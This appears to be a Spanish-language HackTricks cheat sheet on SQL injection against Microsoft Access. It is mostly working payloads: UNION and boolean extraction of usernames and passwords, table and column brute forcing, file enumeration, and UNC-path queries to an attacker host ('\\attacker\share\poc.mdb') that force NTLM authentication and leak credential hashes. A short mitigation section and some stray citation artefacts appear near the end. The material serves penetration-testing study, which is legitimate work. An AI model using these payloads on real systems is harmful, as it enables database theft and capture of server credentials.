# Inyección SQL de MS Access

{{#include ../../banners/hacktricks-training.md}}

## Playground en Línea

- [https://www.w3schools.com/sql/trysql.asp?filename=trysql_func_ms_format&ss=-1](https://www.w3schools.com/sql/trysql.asp?filename=trysql_func_ms_format&ss=-1)

## Limitaciones de la Base de Datos

### Concatenación de Cadenas

La concatenación de cadenas es posible con los caracteres `& (%26)` y `+ (%2b)`.
```sql
1' UNION SELECT 'web' %2b 'app' FROM table%00
1' UNION SELECT 'web' %26 'app' FROM table%00
```
### Comentarios

No hay comentarios en MS Access, pero aparentemente es posible eliminar el último de una consulta con un carácter NULL:
```sql
1' union select 1,2 from table%00
```
Si esto no funciona, siempre podrías corregir la sintaxis de la consulta:
```sql
1' UNION SELECT 1,2 FROM table WHERE ''='
```
### Consultas Apiladas

No son compatibles.

### LIMIT

El operador **`LIMIT`** **no está implementado**. Sin embargo, es posible limitar los resultados de la consulta SELECT a las **primeras N filas de la tabla utilizando el operador `TOP`**. `TOP` acepta como argumento un entero, que representa el número de filas que se devolverán.
```sql
1' UNION SELECT TOP 3 attr FROM table%00
```
Justo como TOP, puedes usar **`LAST`** que obtendrá las **filas del final**.

## Consultas UNION/Subconsultas

En un SQLi, generalmente querrás ejecutar de alguna manera una nueva consulta para extraer información de otras tablas. MS Access siempre requiere que en **subconsultas o consultas adicionales se indique un `FROM`**.\
Así que, si deseas ejecutar un `UNION SELECT` o `UNION ALL SELECT` o un `SELECT` entre paréntesis en una condición, siempre **necesitas indicar un `FROM` con un nombre de tabla válido**.\
Por lo tanto, necesitas conocer un **nombre de tabla válido**.
```sql
-1' UNION SELECT username,password from users%00
```
### Chaining equals + Substring

> [!WARNING]
> Esto te permitirá exfiltrar valores de la tabla actual sin necesidad de conocer el nombre de la tabla.

**MS Access** permite una **sintaxis extraña** como **`'1'=2='3'='asd'=false`**. Como suele ser, la inyección SQL estará dentro de una cláusula **`WHERE`**, lo que podemos abusar.

Imagina que tienes una SQLi en una base de datos de MS Access y sabes (o adivinaste) que un **nombre de columna es username**, y ese es el campo que deseas **exfiltrar**. Podrías verificar las diferentes respuestas de la aplicación web cuando se utiliza la técnica de chaining equals y potencialmente exfiltrar contenido con una **inyección booleana** usando la función **`Mid`** para obtener subcadenas.
```sql
'=(Mid(username,1,3)='adm')='
```
Si conoces el **nombre de la tabla** y **columna** para volcar, puedes usar una combinación entre `Mid`, `LAST` y `TOP` para **filtrar toda la información** a través de SQLi booleano:
```sql
'=(Mid((select last(useranme) from (select top 1 username from usernames)),1,3)='Alf')='
```
_Feel free to check this in the online playground._

### Fuerza bruta de nombres de tablas

Usando la técnica de encadenamiento de iguales, también puedes **fuerza bruta de nombres de tablas** con algo como:
```sql
'=(select+top+1+'lala'+from+<table_name>)='
```
También puedes usar una forma más tradicional:
```sql
-1' AND (SELECT TOP 1 <table_name>)%00
```
_Siéntase libre de verificar esto en el entorno en línea._

- Nombres de tablas comunes de Sqlmap: [https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt](https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt)
- Hay otra lista en [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

### Fuerza Bruta de Nombres de Columnas

Puedes **forzar los nombres de columnas actuales** con el truco de encadenar iguales con:
```sql
'=column_name='
```
O con un **group by**:
```sql
-1' GROUP BY column_name%00
```
O puedes hacer un ataque de fuerza bruta a los nombres de columna de una **tabla diferente** con:
```sql
'=(SELECT TOP 1 column_name FROM valid_table_name)='

-1' AND (SELECT TOP 1 column_name FROM valid_table_name)%00
```
### Volcando datos

Ya hemos discutido la [**técnica de encadenamiento de iguales**](ms-access-sql-injection.md#chaining-equals-+-substring) **para volcar datos de la tabla actual y otras tablas**. Pero hay otras maneras:
```sql
IIF((select mid(last(username),1,1) from (select top 10 username from users))='a',0,'ko')
```
En resumen, la consulta utiliza una declaración "if-then" para activar un "200 OK" en caso de éxito o un "500 Internal Error" en caso contrario. Aprovechando el operador TOP 10, es posible seleccionar los primeros diez resultados. El uso posterior de LAST permite considerar solo la décima tupla. Con dicho valor, utilizando el operador MID, es posible realizar una simple comparación de caracteres. Cambiando adecuadamente el índice de MID y TOP, podemos volcar el contenido del campo "username" para todas las filas.

### Trucos Basados en Tiempo (Ciegos)

Jet/ACE SQL en sí **no** expone una función nativa `SLEEP()` o `WAITFOR`, por lo que las inyecciones ciegas basadas en tiempo son limitadas. Sin embargo, aún puedes introducir un retraso medible forzando al motor a acceder a un **recurso de red que sea lento o no responda**. Debido a que el motor intentará abrir el archivo antes de devolver el resultado, el tiempo de respuesta HTTP refleja la latencia de ida y vuelta al host controlado por el atacante.
```sql
' UNION SELECT 1 FROM SomeTable IN '\\10.10.14.3\doesnotexist\dummy.mdb'--
```
Apunte la ruta UNC a:

* un recurso compartido SMB detrás de un enlace de alta latencia
* un host que descarta el apretón de manos TCP después de `SYN-ACK`
* un agujero negro de firewall

Los segundos adicionales introducidos por la búsqueda remota se pueden utilizar como un **oráculo de temporización fuera de banda** para condiciones booleanas (por ejemplo, elegir un camino lento solo cuando el predicado inyectado es verdadero). Microsoft documenta el comportamiento de la base de datos remota y el interruptor de apagado asociado en KB5002984. citeturn1search0

### Otras funciones interesantes

- `Mid('admin',1,1)` obtener subcadena desde la posición 1 longitud 1 (la posición inicial es 1)
- `LEN('1234')` obtener longitud de la cadena
- `ASC('A')` obtener valor ascii del carácter
- `CHR(65)` obtener cadena del valor ascii
- `IIF(1=1,'a','b')` si entonces
- `COUNT(*)` contar número de elementos

## Enumerando tablas

Desde [**aquí**](https://dataedo.com/kb/query/access/list-of-tables-in-the-database) puedes ver una consulta para obtener los nombres de las tablas:
```sql
select MSysObjects.name
from MSysObjects
where
MSysObjects.type In (1,4,6)
and MSysObjects.name not like '~*'
and MSysObjects.name not like 'MSys*'
order by MSysObjects.name
```
Sin embargo, ten en cuenta que es muy típico encontrar inyecciones SQL donde **no tienes acceso para leer la tabla `MSysObjects`**.

## Acceso al sistema de archivos

### Ruta completa del directorio raíz web

El conocimiento de la **ruta absoluta del directorio raíz web puede facilitar ataques adicionales**. Si los errores de la aplicación no están completamente ocultos, se puede descubrir la ruta del directorio intentando seleccionar datos de una base de datos inexistente.

`http://localhost/script.asp?id=1'+ '+UNION+SELECT+1+FROM+FakeDB.FakeTable%00`

MS Access responde con un **mensaje de error que contiene la ruta completa del directorio web**.

### Enumeración de archivos

El siguiente vector de ataque se puede utilizar para **inferir la existencia de un archivo en el sistema de archivos remoto**. Si el archivo especificado existe, MS Access genera un mensaje de error informando que el formato de la base de datos es inválido:

`http://localhost/script.asp?id=1'+UNION+SELECT+name+FROM+msysobjects+IN+'\boot.ini'%00`

Otra forma de enumerar archivos consiste en **especificar un elemento database.table**. **Si** el **archivo especificado existe**, MS Access muestra un **mensaje de error de formato de base de datos**.

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+C:\boot.ini.TableName%00`

### Adivinanza del nombre del archivo .mdb

El **nombre del archivo de base de datos (.mdb)** se puede inferir con la siguiente consulta:

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+name[i].realTable%00`

Donde **name[i] es un nombre de archivo .mdb** y **realTable es una tabla existente** dentro de la base de datos. Aunque MS Access siempre generará un mensaje de error, es posible distinguir entre un nombre de archivo inválido y un nombre de archivo .mdb válido.

### Acceso a bases de datos remotas y robo de credenciales NTLM (2023)

Desde Jet 4.0, cada consulta puede hacer referencia a una tabla ubicada en un archivo `.mdb/.accdb` *diferente* a través de la cláusula `IN '<path>'`:
```sql
SELECT first_name FROM Employees IN '\\server\share\hr.accdb';
```
Si la entrada del usuario se concatena en la parte después de **IN** (o en una llamada `JOIN … IN` / `OPENROWSET` / `OPENDATASOURCE`), un atacante puede especificar una **ruta UNC** que apunte a un host que controlan. El motor:

1. intentará autenticarse a través de SMB / HTTP para abrir la base de datos remota;
2. filtrará las **credenciales NTLM** del servidor web (autenticación forzada);
3. analizará el archivo remoto: una base de datos malformada o maliciosa puede desencadenar errores de corrupción de memoria de Jet/ACE que han sido parcheados múltiples veces (por ejemplo, CVE-2021-28455).

Ejemplo práctico de inyección:
```sql
1' UNION SELECT TOP 1 name
FROM MSysObjects
IN '\\attacker\share\poc.mdb'-- -
```
Impacto:

* Exfiltración fuera de banda de hashes Net-NTLMv2 (utilizables para relay o cracking offline).
* Posible ejecución remota de código si se explota un nuevo error en el analizador Jet/ACE.

Mitigaciones (recomendadas incluso para aplicaciones Classic ASP heredadas):

* Agregar el valor del registro `AllowQueryRemoteTables = 0` bajo `HKLM\Software\Microsoft\Jet\4.0\Engines` (y bajo la ruta equivalente de ACE). Esto obliga a Jet/ACE a rechazar rutas remotas que comienzan con `\\`.
* Bloquear SMB/WebDAV saliente en el límite de la red.
* Sanitizar / parametrizar cualquier parte de una consulta que pueda terminar dentro de una cláusula `IN`.

El vector de autenticación forzada fue revisitado por Check Point Research en 2023, demostrando que aún es explotable en Windows Server completamente parcheado cuando la clave del registro está ausente. citeturn0search0

### .mdb Cracker de Contraseñas

[**Access PassView**](https://www.nirsoft.net/utils/accesspv.html) es una utilidad gratuita que se puede usar para recuperar la contraseña principal de la base de datos de Microsoft Access 95/97/2000/XP o Jet Database Engine 3.0/4.0.

## Referencias

- [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)
- [Microsoft KB5002984 – Configurando Jet/ACE para bloquear tablas remotas](https://support.microsoft.com/en-gb/topic/kb5002984-configuring-jet-red-database-engine-and-access-connectivity-engine-to-block-access-to-remote-databases-56406821-30f3-475c-a492-208b9bd30544)
- [Check Point Research – Abusando de las Tablas Vinculadas de Microsoft Access para la Autenticación Forzada NTLM (2023)](https://research.checkpoint.com/2023/abusing-microsoft-access-linked-table-feature-to-perform-ntlm-forced-authentication-attacks/)

{{#include ../../banners/hacktricks-training.md}}
